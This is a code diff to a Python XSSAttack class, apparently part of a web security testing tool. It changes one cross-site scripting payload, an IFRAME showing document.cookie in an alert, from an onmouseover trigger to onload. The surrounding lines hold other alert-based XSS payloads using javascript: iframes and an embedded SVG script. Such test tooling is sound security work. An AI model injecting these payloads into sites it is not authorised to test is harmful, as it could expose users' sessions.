@@ -553,7 +553,7 @@ class XSSAttack(Attack):
             attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
             attack = "<IFRAME SRC=\"javascript:alert(\'"+ attackKeyWord + "\');\"></IFRAME>"
         elif attackCategory == 7:
-            attack = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>"
+            attack = "<IFRAME SRC=# onload=\"alert(document.cookie)\"></IFRAME>"
         elif attackCategory == 8:
             attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
             base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
